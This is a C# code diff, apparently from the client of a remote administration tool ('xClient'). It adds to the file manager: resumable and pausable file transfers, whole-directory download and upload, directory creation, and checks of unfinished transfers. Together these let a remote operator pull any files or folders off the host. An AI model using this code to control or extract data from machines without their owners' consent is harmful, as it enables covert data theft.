@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Security;
+using System.Security.Cryptography;
 using System.Threading;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
@@ -52,8 +54,11 @@ namespace xClient.Core.Commands
                 {
                     //files = new string[] {DELIMITER};
                     //filessize = new long[] {0};
-                    lastModificationDates = new DateTime[] { DateTime.MinValue };
-                    creationDates = new DateTime[] { DateTime.MinValue };
+                    if (iFolders.Length == 0)
+                    {
+                        lastModificationDates = new DateTime[] {DateTime.MinValue};
+                        creationDates = new DateTime[] {DateTime.MinValue};
+                    }
                 }
 
                 i = 0;
@@ -68,7 +73,7 @@ namespace xClient.Core.Commands
                     folders = new string[] {DELIMITER};
 
                 new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize, lastModificationDates,
-                    creationDates).Execute(client);
+                    creationDates, command.Detail).Execute(client);
             }
             catch (UnauthorizedAccessException)
             {
@@ -107,6 +112,24 @@ namespace xClient.Core.Commands
 
         public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
         {
+            // Resumed
+            if (_pausedDownloads.ContainsKey(command.ID))
+                _pausedDownloads.Remove(command.ID);
+
+            if (Directory.Exists(command.RemotePath))
+            {
+                HandleDownloadDirectory(new DoDownloadDirectory
+                {
+                    ID = command.ID,
+                    Type = DownloadType.Full,
+                    RemotePath = command.RemotePath,
+                    ItemOptions = null,
+                    StartBlock = command.StartBlock,
+                    Items = null
+                }, client);
+                return;
+            }
+
             new Thread(() =>
             {
                 _limitThreads.WaitOne();
@@ -116,9 +139,10 @@ namespace xClient.Core.Commands
                     if (srcFile.MaxBlocks < 0)
                         throw new Exception(srcFile.LastError);
 
-                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                    for (int currentBlock = command.StartBlock; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
-                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
+                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID) ||
+                            _pausedDownloads.ContainsKey(command.ID))
                             break;
 
                         byte[] block;
@@ -126,15 +150,23 @@ namespace xClient.Core.Commands
                         if (!srcFile.ReadBlock(currentBlock, out block))
                             throw new Exception(srcFile.LastError);
 
+                        var startTime = DateTime.MinValue;
+                        if (currentBlock == command.StartBlock || command.Resumed)
+                        {
+                            startTime = DateTime.Now;
+                            if (command.Resumed)
+                                command.Resumed = false;
+                        }
+
                         new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                             Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
-                            srcFile.LastError).Execute(client);
+                            srcFile.LastError, ItemType.File, startTime, command.RemotePath).Execute(client);
                     }
                 }
                 catch (Exception ex)
                 {
                     new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath),
-                            new byte[0], -1, -1, ex.Message)
+                        new byte[0], -1, -1, ex.Message, ItemType.File, DateTime.MinValue, command.RemotePath)
                         .Execute(client);
                 }
                 _limitThreads.Release();
@@ -146,7 +178,8 @@ namespace xClient.Core.Commands
             if (!_canceledDownloads.ContainsKey(command.ID))
             {
                 _canceledDownloads.Add(command.ID, "canceled");
-                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled")
+                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled",
+                    ItemType.File, DateTime.MinValue)
                     .Execute(client);
             }
         }
@@ -185,7 +218,9 @@ namespace xClient.Core.Commands
                         break;
                 }
 
-                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
+                HandleGetDirectory(
+                    new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path),
+                        InformationDetail.Standard), client);
             }
             catch (UnauthorizedAccessException)
             {
@@ -239,7 +274,9 @@ namespace xClient.Core.Commands
                         break;
                 }
 
-                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)),
+                HandleGetDirectory(
+                    new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath),
+                        InformationDetail.Standard),
                     client);
             }
             catch (UnauthorizedAccessException)
@@ -323,7 +360,7 @@ namespace xClient.Core.Commands
                         new Packets.ClientPackets.SearchDirectoryResponse()
                         {
                             Progress = SearchProgress.Finished,
-                            FilesSize = new long[] { _itemsFound } 
+                            FilesSize = new long[] {_itemsFound}
                         }.Execute(client);
 
                         _searchThreadReset.Reset();
@@ -336,8 +373,6 @@ namespace xClient.Core.Commands
                     _searchTokenSource.Cancel();
                     _searchThreadReset.Reset();
                     break;
-                default:
-                    throw new ArgumentOutOfRangeException();
             }
         }
 
@@ -348,12 +383,236 @@ namespace xClient.Core.Commands
                 case TimeoutType.Milliseconds:
                     return timeout < -1 ? -1 : timeout;
                 case TimeoutType.Seconds:
-                    return timeout < -1 ? -1 : timeout * 1000;
+                    return timeout < -1 ? -1 : timeout*1000;
                 case TimeoutType.Minutes:
-                    return timeout < -1 ? -1 : timeout * 60000;
+                    return timeout < -1 ? -1 : timeout*60000;
                 default:
                     return -1;
             }
+        }
+
+        public static void HandleCreateDirectory(DoCreateDirectory command, Client client)
+        {
+            bool isError = false;
+            string message = null;
+
+            Action<string> onError = (msg) =>
+            {
+                isError = true;
+                message = msg;
+            };
+
+            try
+            {
+                Directory.CreateDirectory(Path.Combine(command.Path, command.Name));
+
+                HandleGetDirectory(
+                    new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path),
+                        InformationDetail.Standard), client);
+            }
+            catch (UnauthorizedAccessException)
+            {
+                onError("CreateDirectory No permission");
+            }
+            catch (ArgumentNullException)
+            {
+                onError("CreateDirectory Path cannot be empty");
+            }
+            catch (PathTooLongException)
+            {
+                onError("CreateDirectory Path too long");
+            }
+            catch (DirectoryNotFoundException)
+            {
+                onError("CreateDirectory Path is invalid");
+            }
+            catch (NotSupportedException)
+            {
+                onError("CreateDirectory Path has invalid characters");
+            }
+            catch (ArgumentException)
+            {
+                onError("CreateDirectory Path is invalid");
+            }
+            catch (IOException)
+            {
+                onError("CreateDirectory I/O error");
+            }
+            finally
+            {
+                if (isError && !string.IsNullOrEmpty(message))
+                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
+            }
+        }
+
+        public static void HandleDownloadDirectory(DoDownloadDirectory command, Client client)
+        {
+            var vDir = VirtualDirectory.Create(command.RemotePath, command.Items, command.ItemOptions);
+
+            new Thread(() =>
+            {
+                _limitThreads.WaitOne();
+                try
+                {
+                    FileSplit srcFile = new FileSplit(vDir);
+                    if (srcFile.MaxBlocks < 0)
+                        throw new Exception(srcFile.LastError);
+
+                    for (int currentBlock = command.StartBlock; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                    {
+                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
+                            break;
+
+                        byte[] block;
+
+                        if (!srcFile.ReadBlock(currentBlock, out block))
+                            throw new Exception(srcFile.LastError);
+
+                        var startTime = DateTime.MinValue;
+                        if (currentBlock == command.StartBlock)
+                            startTime = DateTime.Now;
+
+                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
+                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
+                            srcFile.LastError, ItemType.Directory, startTime, command.RemotePath).Execute(client);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath),
+                        new byte[0], -1, -1, ex.Message, ItemType.Directory, DateTime.MinValue, command.RemotePath)
+                        .Execute(client);
+                }
+                _limitThreads.Release();
+            }).Start();
+
+        }
+
+        public static void HandleUploadDirectory(Packets.ServerPackets.DoUploadDirectory command, Client client)
+        {
+            bool isError = false;
+            string message = null;
+
+            Action<string> onError = (msg) =>
+            {
+                isError = true;
+                message = msg;
+            };
+
+            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
+                NativeMethods.DeleteFile(command.RemotePath); // delete existing file
+
+            FileSplit destFile = new FileSplit(command.RemotePath);
+            destFile.AppendBlock(command.Block, command.CurrentBlock);
+
+            if (command.CurrentBlock + 1 == command.MaxBlocks)
+            {
+                var vDir = new VirtualDirectory().DeSerialize(command.RemotePath);
+                try
+                {
+                    Directory.Move(command.RemotePath, command.RemotePath + ".bkp");
+                    vDir.SaveToDisk(Path.GetDirectoryName(command.RemotePath));
+                    File.Delete(command.RemotePath + ".bkp");
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    onError("CreateDirectory No permission");
+                }
+                catch (ArgumentNullException)
+                {
+                    onError("CreateDirectory Path cannot be empty");
+                }
+                catch (PathTooLongException)
+                {
+                    onError("CreateDirectory Path too long");
+                }
+                catch (DirectoryNotFoundException)
+                {
+                    onError("CreateDirectory Path is invalid");
+                }
+                catch (NotSupportedException)
+                {
+                    onError("CreateDirectory Path has invalid characters");
+                }
+                catch (ArgumentException)
+                {
+                    onError("CreateDirectory Path is invalid");
+                }
+                catch (IOException)
+                {
+                    onError("CreateDirectory I/O error");
+                }
+                finally
+                {
+                    if (isError && !string.IsNullOrEmpty(message))
+                        new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
+                }
+            }
+        }
+
+        public static void HandleDownloadFilePause(Packets.ServerPackets.DoDownloadFilePause command, Client client)
+        {
+            if (!_pausedDownloads.ContainsKey(command.ID))
+            {
+                _pausedDownloads.Add(command.ID, "paused");
+
+                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "paused", new byte[0], -1, -1, "Paused",
+                    ItemType.File, DateTime.MinValue)
+                    .Execute(client);
+            }
+        }
+
+        public static void HandleUploadFilePause(Packets.ServerPackets.DoDownloadFilePause command, Client client)
+        {
+            if (!_pausedUploads.ContainsKey(command.ID))
+                _pausedUploads.Add(command.ID, "paused");
+        }
+
+        public static void HandleVerifyUnfinishedTransfers(Packets.ServerPackets.DoVerifyUnfinishedTransfers command,
+            Client client)
+        {
+            var transferIDs = new List<int>();
+            var transferTypes = new List<bool>();
+
+            for (var i = 0; i < command.Files.Length; i++)
+            {
+                try
+                {
+                    var path = command.Files[i];
+                    bool isFile = false;
+                    if (!(isFile = File.Exists(path)) && !Directory.Exists(path))
+                        continue;
+
+                    using (var fs = new FileStream(path, FileMode.Open))
+                    {
+                        byte[] magicBuffer = new byte[sizeof(int)];
+                        fs.Read(magicBuffer, 0, magicBuffer.Length);
+                        // If the file has magic it means it's a virtual directory AKA folder
+                        transferTypes.Add(BitConverter.ToInt32(magicBuffer, 0) != VirtualDirectory.Magic);
+                    }
+
+                    var localHash = new byte[FileSplit.MAX_BLOCK_SIZE];
+                    var remoteHash = new byte[16];
+                    Buffer.BlockCopy(command.SampleHashes, i * 16, remoteHash, 0, 16);
+
+                    using (var fs = new FileStream(path, FileMode.Open))
+                    {
+                        fs.Seek(-FileSplit.MAX_BLOCK_SIZE, SeekOrigin.End);
+                        fs.Read(localHash, 0, localHash.Length);
+                    }
+
+                    using (var md5 = MD5.Create())
+                        localHash = md5.ComputeHash(localHash);
+
+                    if (!CryptographyHelper.AreEqual(localHash, remoteHash))
+                        continue;
+
+                    transferIDs.Add(command.TransferIDs[i]);
+                }
+                catch { }
+            }
+
+            new DoVerifyUnfinishedTransferResponse(transferIDs.ToArray(), transferTypes.ToArray()).Execute(client);
         }
     }
 }
